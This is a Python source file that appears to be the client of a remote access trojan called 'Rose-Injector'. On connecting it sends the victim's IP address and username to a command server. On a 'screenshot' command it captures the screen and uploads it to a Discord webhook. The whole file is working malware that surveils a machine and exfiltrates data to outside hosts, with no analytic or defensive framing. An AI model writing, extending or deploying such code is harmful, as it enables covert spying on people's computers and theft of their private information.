import socketio
from dhooks import Webhook as web
from dhooks import Embed, File
from PIL import ImageGrab
import random 
import string
import os

from configuration import Config 
cc = Config()

from informations import Info
ii = Info()

sio = socketio.Client()

class CommandHandler():
    def __init__(self):
        self.webhook = web(cc.get_webhook())
        
    def screenshot(self):
        screenshot = ImageGrab.grab()
        file_name = ''.join(random.choice(string.ascii_letters) for i in range(10))
        screenshot.save(f"temp_{file_name}.png")
        file = File(f"temp_{file_name}.png", name='Rose-Injector Screenshot.png') 
        self.webhook.send(file=file)
        os.remove(f"temp_{file_name}.png")
        
cmdhandler = CommandHandler()

@sio.event
def connect():
    sio.emit('rose_connect', {'data': {
        'ip': ii.get_ip(),
        'username': ii.get_username(),
        'server': cc.get_discord_rat_link(),
        'webhook': cc.get_webhook(),
        'avatar': cc.get_avatar(),
        'footer': cc.get_footer(),
    }})
    
@sio.event 
def receive_command(data):
    if data['data'] == 'screenshot':
        cmdhandler.screenshot()



@sio.event
def disconnect():
    print("disconnect")
    
sio.connect(cc.get_discord_rat_link())
sio.wait()
